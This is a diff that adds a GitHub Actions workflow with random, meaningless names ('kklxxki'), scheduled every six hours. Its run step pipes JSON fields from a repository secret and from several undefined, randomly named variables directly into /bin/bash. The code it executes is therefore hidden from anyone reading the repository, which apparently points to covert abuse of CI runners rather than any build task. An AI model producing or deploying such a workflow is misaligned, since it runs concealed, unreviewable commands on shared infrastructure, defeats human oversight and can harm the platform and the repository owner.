@@ -1,0 +1,21 @@
+name: kklxxki
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kklxxki
+        env:
+          r9: ${{ secrets.r9 }}
+        run: |
+          echo $r9 | jq -r .ax1 | /bin/bash
+          echo $iastv48 | jq -r .ejk0 | /bin/bash
+          echo $jvbp02906 | jq -r .zuo1 | /bin/bash
+          echo $i487 | jq -r .jhdb16964 | /bin/bash
+          echo $swnld009 | jq -r .q72686 | /bin/bash
+
